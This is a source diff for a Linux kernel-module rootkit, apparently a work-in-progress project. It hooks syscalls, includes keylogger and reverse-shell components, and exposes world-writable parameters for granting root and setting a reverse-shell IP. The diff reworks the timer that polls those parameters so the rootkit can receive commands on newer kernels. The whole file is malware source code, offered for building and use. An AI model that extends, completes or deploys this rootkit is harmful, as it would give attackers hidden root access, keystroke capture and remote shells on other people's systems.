@@ -7,17 +7,47 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/timer.h>
+// #include <linux/timer.h>
+// #include <linux/jiffies.h>
+#include <linux/delay.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
 
 MODULE_AUTHOR("Aaron Lichtman");
 MODULE_AUTHOR("Arch Gupta");
-MODULE_AUTHOR("Brandon Weidner");
 MODULE_DESCRIPTION("Linux rootkit.");
 MODULE_VERSION("0.1");
 MODULE_LICENSE("GPL");
+
+/**
+ * Data structures
+ */
+
+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
+	typedef struct legacy_timer_emu {
+		struct timer_list t;
+		void (*function)(unsigned long);
+		unsigned long data;
+	} _timer;
+#else
+	typedef struct timer_list _timer;
+#endif
+
+struct commands {
+    // TODO: Add properties for each of the commands we can accept
+    char* rev_shell_ip;
+    // etc
+} commands;
+
+/**
+ * Global defines and variables.
+ */
+
+#define POLLING_INTERVAL 300
+static _timer polling_timer;
+struct commands cmds;
+
 
 /**
  * Module parameters are made writable by anyone.
@@ -38,26 +68,11 @@ module_param(escalate_privileges, bool, 0770);
 MODULE_PARM_DESC(escalate_privileges, "Toggle for escalating current user to root.");
 
 /**
- * Data structures
+ * Forward declarations
  */
 
-static struct timer_list polling_timer;
+static void poll_for_commands(unsigned long data);
 
-struct command_vals {
-    // TODO: Add properties for each of the commands we can accept
-    char* rev_shell_ip;
-    // etc
-}
-
-static struct command_vals cmds;
-
-/**
- * Function Headers
- */
-
-void poll_for_commands();
-void set_new_timer(const unsigned int msecs);
-void setup_timer(struct timer_list* timer, void (*function)(unsigned long), unsigned long data);
 
 // TODO: Figure out if this is needed at all.
 // /**
@@ -72,7 +87,10 @@ void setup_timer(struct timer_list* timer, void (*function)(unsigned long), unsi
 //     }
 // }
 
-// Hooking open syscall?
+/**
+ * Syscall hooks
+ */
+
 /**
 KHOOK(fget);
 static int khook_fget(unsigned int fd) {
@@ -92,25 +110,53 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 }
 
 /**
- * Gives the current user root priveleges.
- **/
-// static void get_root() {
-//     // TODO
-// }
+ * Timer and Command Polling Functions
+ * Kernel v4.15 support adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
+ */
 
-void set_new_timer(const unsigned int msecs) {
-    printk("Starting timer to fire in %u (%ld)\n", msecs, jiffies);
-    if (mod_timer(&polling_timer, jiffies + msecs_to_jiffies(msecs))) {
-        printk("Error setting timer.\n");
-    }
+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
+static void legacy_timer_function_wrapper(_timer *timer) {
+	struct legacy_timer_emu *legacy_timer = from_timer(legacy_timer, timer, timer);
+    // legacy_timer->data is currently always NULL
+	legacy_timer->function(legacy_timer->data);
+}
+#endif
+
+__inline void timer_init_wrapper(_timer *timer, void* func) {
+    timer->data = 0;
+    timer->function = func;
+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
+	timer_setup(&timer->t, legacy_timer_function_wrapper, 0);
+#else
+	init_timer(timer);
+#endif
+}
+
+__inline static void set_timer(_timer *timer) {
+	unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
+	mod_timer(&timer->t, expires);
+#else
+	mod_timer(timer, expires);
+#endif
+	printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
+}
+
+__inline static void timer_cleanup_wrapper(_timer *timer) {
+#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
+    del_timer_sync(&timer->t);
+#else
+    del_timer_sync(timer);
+#endif
 }
 
 /**
  * Check all parameters against last-known values and see if anything changed.
  * If yes, take the requested action.
  * Finally, start a timer to call this function again in the future.
+ * NOTE: The data parameter is required.
  */
-void poll_for_commands() {
+static void poll_for_commands(unsigned long data) {
     // TODO: Store previous values of variables somewhere.
     printk(KERN_INFO "Polling for commands!\n");
     if (rev_shell_ip) {
@@ -126,20 +172,26 @@ void poll_for_commands() {
     //     get_root();
     // }
 
-    set_new_timer(300);
+    set_timer(&polling_timer);
 }
 
 /**
  * Rootkit module initialization.
  */
 static int __init rootkit_init(void) {
-    printk(KERN_INFO "Initializing rootkit.\n");
-    printk(KERN_INFO "Initializing timer.\n");
+    printk(KERN_INFO "Initializing rootkit...\n");
     khook_init();
+
+    printk(KERN_INFO "Reading parameters...\n");
     // TODO: Populate cmds struct to be passed to poll_for_commands(data)
     cmds.rev_shell_ip = rev_shell_ip;
-    // Set up timer to check for changes in the parameters, to detect commands being run.
-    setup_timer(&polling_timer, poll_for_commands, 0);
+
+    printk(KERN_INFO "Initializing timer...\n");
+    timer_init_wrapper(&polling_timer, poll_for_commands);
+    set_timer(&polling_timer);
+
+	// Gotta make the compiler happy.
+	poll_for_commands(0);
     return 0;
 }
 
@@ -149,7 +201,7 @@ static int __init rootkit_init(void) {
 static void __exit rootkit_exit(void) {
     printk(KERN_INFO "Cleaning up rootkit.\n");
     khook_cleanup();
-    del_timer(&polling_timer)
+    timer_cleanup_wrapper(&polling_timer);
 }
 
 module_init(rootkit_init);
